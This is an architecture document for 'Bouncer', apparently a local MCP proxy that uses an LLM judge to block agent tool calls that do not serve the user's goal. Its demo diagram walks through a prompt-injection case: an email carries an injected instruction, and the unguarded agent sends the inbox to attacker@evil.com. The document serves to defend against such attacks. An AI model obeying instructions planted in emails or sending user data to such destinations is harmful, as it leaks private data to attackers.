# Bouncer architecture

> **Prompt filters ask whether content looks malicious. Bouncer asks whether the concrete side effect is authorized by the user's goal.**

Bouncer is a local stdio MCP relay. The agent connects to Bouncer as if it were the tool server. Bouncer connects to the real downstream tool servers and forwards a call only when it is allowed.

## Diagram

```mermaid
flowchart LR
    user(["User goal:<br/>read my emails and<br/>summarize what's important"])
    agent[AGENT<br/>MCP client]

    subgraph bouncer [BOUNCER · MCP proxy]
        direction TB
        goal[Original goal<br/>via bouncer_set_goal]
        norm[Normalize call to an effect<br/>READ · SEND + destination · EXECUTE]
        ctx[Context window<br/>previous 2 tool results]
        judge{{NVIDIA Nemotron Super<br/>does this action match the goal?}}
        gate{Verdict}
        audit[(JSONL audit log<br/>effect · verdict · reason · latency)]
        goal --> judge
        norm --> judge
        ctx --> judge
        judge --> gate
    end

    tools[Real tool servers<br/>email · GitHub · ...]

    user -->|goal| agent
    user -.->|set once| goal
    agent -->|tools/call| norm
    gate -->|ALLOW| tools
    gate -->|BLOCK / invalid / error<br/>structured refusal| agent
    tools -->|result| ctx
    tools -->|result| agent
    gate -.-> audit
```

## Decision path for one `tools/call`

1. **No goal yet?** Block. The host must call `bouncer_set_goal` first.
2. **Unknown tool?** Block.
3. **Normalize** the call into `READ`, `SEND` (with destination), or `EXECUTE`, and extract neutral resource and destination identifiers.
4. **Judge.** Nemotron Super receives the goal, the concrete action with typed arguments, and the previous two untrusted tool results. It returns a strict JSON `{ verdict, reason }`.
5. **Enforce.**
   - `ALLOW` is forwarded only after the audit record is written.
   - `BLOCK` returns a structured refusal to the agent: `blocked: true`, effect, tool, reason.
   - An invalid or missing verdict, a network error, or an audit failure is a block. The action is not forwarded.
   - A `SEND` to a destination the original goal never named is blocked even if the model says `ALLOW`. V1 treats `ASK` as `BLOCK`.
6. **Remember.** After a forwarded call, its result is added to the two-call context window used for the next decision.

The decision engine has one narrow job, and the model never sees or replaces enforcement. Only the proxy forwards calls.

## Demo flow: same trajectory, Bouncer off vs. on

The demo replays one email trajectory twice, against mocked local MCP servers (`demo/email-server.ts`). The goal in both runs is *"Read my emails and summarize what's important."*

```mermaid
sequenceDiagram
    autonumber
    participant A as Agent
    participant B as Bouncer
    participant N as Nemotron Super
    participant E as Email server (mock)

    Note over A,E: Run 1 · Bouncer OFF (agent talks to the email server directly)
    A->>E: email_list_messages
    A->>E: email_read_message mail-1
    A->>E: email_read_message mail-2 (contains an injected instruction)
    A->>E: email_send_message to attacker@evil.com
    E-->>A: sent, so the inbox went to the attacker

    Note over A,E: Run 2 · Bouncer ON (identical trajectory through the proxy)
    A->>B: bouncer_set_goal
    A->>B: email_list_messages
    B->>N: goal + READ action
    N-->>B: ALLOW
    B->>E: forward
    A->>B: email_read_message mail-1, mail-2
    B->>N: goal + READ action
    N-->>B: ALLOW
    B->>E: forward
    A->>B: email_send_message to attacker@evil.com
    B->>N: goal + SEND action + prior 2 tool results
    N-->>B: BLOCK (untrusted content, not the user's goal)
    B-->>A: refusal (not forwarded, audit record written)
    Note over A: The summary the user asked for is still produced
```

Run it: `cd packages/proxy && npm run demo:offline` (no network) or `npm run demo` (live Nemotron Super, needs `NVIDIA_API_KEY`). The offline replay uses a scripted stand-in for the judge, so it demonstrates the proxy plumbing and not the model's reasoning.

## Evaluation pipeline

Separate from the runtime proxy, `bouncer_eval` scores decision engines on frozen `{goal, action, effect, context}` cases with an expected verdict.

```mermaid
flowchart LR
    data["eval/datasets/go_no_go_v1.jsonl<br/>48 cases · 6 families"] --> run["python3 -m bouncer_eval.cli"]
    run --> det[deterministic rules]
    run --> nemo[Nemotron Super / Lightning]
    run --> hyb[hybrid: invariants + Nemotron]
    det --> rep[metrics · failures]
    nemo --> rep
    hyb --> rep
    rep --> out[eval/results/*.json · *.md]
    out --> plot["eval/plot_pareto.py → pareto.svg"]
```

These are per-call diagnostics. End-to-end scoring (did the attacker's objective ultimately succeed?) is a stated goal in [`MASTERPLAN.md`](../../MASTERPLAN.md) and is not part of the diagram above.

## What is and isn't built

| Built | Designed, not built (V2) |
|---|---|
| MCP proxy, goal capture, `READ`/`SEND`/`EXECUTE` normalization | `WRITE`, `TRANSACT`, `AUTHORIZE` effects |
| Nemotron Super judge, strict JSON, fail-closed enforcement | Persistent trajectory state |
| Unnamed-destination `SEND` stopped (`ASK` treated as `BLOCK`) | Human approval flow for `ASK` |
| Mock email and GitHub servers, counterfactual demo, clip | Nano/Lightning triage tier (unreliable via hosted API in our run) |
| 48-case per-call eval, deterministic baseline, hybrid evaluator | End-to-end, public-benchmark, and adaptive-attack evaluation |

Where this table and the repository disagree, the repository is right. Update the table.
